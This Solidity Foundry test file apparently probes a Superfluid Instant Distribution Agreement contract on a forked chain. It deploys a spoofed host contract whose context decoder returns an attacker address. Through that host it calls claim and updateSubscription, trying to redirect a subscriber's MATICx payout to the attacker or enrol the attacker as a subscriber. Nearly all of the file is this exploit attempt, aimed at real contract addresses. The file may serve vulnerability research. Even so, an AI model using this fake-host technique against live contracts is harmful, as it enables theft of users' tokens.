// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface IIDA {
    function claim(address,address,uint32,address,bytes calldata) external returns (bytes memory);
    function updateSubscription(address,uint32,address,uint128,bytes calldata) external returns (bytes memory);
    function getSubscription(address,address,uint32,address) external view returns (bool,bool,uint128,uint256);
}
interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256,uint256,uint256);
}

/// FakeHost that returns ATTACKER as msgSender from decodeCtx
contract FakeHost2 {
    address public attacker;
    constructor(address _atk) { attacker = _atk; }
    
    function getAppManifest(address) external pure returns (bool,bool,uint256) { return (false,false,0); }
    function isApp(address) external pure returns (bool) { return false; }
    function isCtxValid(bytes calldata) external pure returns (bool) { return true; }
    
    // KEY: decodeCtx returns attacker as msgSender
    function decodeCtx(bytes memory) external view returns (
        uint8,uint8,uint256,address,bytes4,bytes memory,uint256,uint256,int256,address,address
    ) {
        return (0,1,0, attacker, bytes4(0),"",0,0,0,address(0),address(0));
    }
    
    function appCallbackPush(bytes calldata,address,uint256,int256,address) external returns (bytes memory) {
        return "";
    }
    function appCallbackPop(bytes calldata ctx,int256) external returns (bytes memory) { return ctx; }
    function callAppBeforeCallback(address,bytes calldata,bool,bytes calldata) external returns (bytes memory) { return ""; }
    function callAppAfterCallback(address,bytes calldata,bool,bytes calldata) external returns (bytes memory) { return ""; }

    function callIDA(address ida, bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) = ida.call(data);
        if (!ok) { assembly { revert(add(ret,32),mload(ret)) } }
        return ret;
    }
}

contract FakeHostDecodeTest is Test {
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUB = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    FakeHost2 fakeHost;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
        fakeHost = new FakeHost2(ATTACKER);
    }

    // Test: claim with subscriber=SUB, but FakeHost.decodeCtx returns ATTACKER
    // Does the settlement go to SUB (function param) or ATTACKER (decoded ctx)?
    function test_claimRedirect() public {
        uint256 atkBefore = IMATICx(MATICx).balanceOf(ATTACKER);
        uint256 subBefore = IMATICx(MATICx).balanceOf(SUB);
        
        bytes memory ctx = abi.encode(
            abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),
            abi.encode(uint256(0),int256(0),address(0),address(0))
        );
        
        try fakeHost.callIDA(IDA, abi.encodeWithSelector(
            IIDA.claim.selector, MATICx, PUB, uint32(1), SUB, ctx
        )) {
            uint256 atkAfter = IMATICx(MATICx).balanceOf(ATTACKER);
            uint256 subAfter = IMATICx(MATICx).balanceOf(SUB);
            console.log("ATK delta:", int256(atkAfter) - int256(atkBefore));
            console.log("SUB delta:", int256(subAfter) - int256(subBefore));
        } catch (bytes memory err) {
            console.log("FAILED");
        }
    }
    
    // Test: what if we call updateSubscription through FakeHost?
    // It normally checks authorizeTokenAccess → unauthorized host
    // But maybe FakeHost.isCtxValid returning true changes things?
    function test_updateSubViaFakeHost() public {
        bytes memory ctx = abi.encode(
            abi.encode(uint256(1<<32),uint256(0),ATTACKER,bytes4(0),bytes("")),
            abi.encode(uint256(0),int256(0),address(0),address(0))
        );
        
        // Try to add attacker as subscriber to PUB's index
        try fakeHost.callIDA(IDA, abi.encodeWithSelector(
            IIDA.updateSubscription.selector, MATICx, uint32(1), ATTACKER, uint128(1000), ctx
        )) {
            console.log("updateSubscription SUCCEEDED!!!");
            (bool e,bool a,uint128 u,) = IIDA(IDA).getSubscription(MATICx, PUB, 1, ATTACKER);
            console.log("exist:", e, "units:", u);
        } catch (bytes memory err) {
            console.log("updateSubscription FAILED (expected)");
        }
    }
}
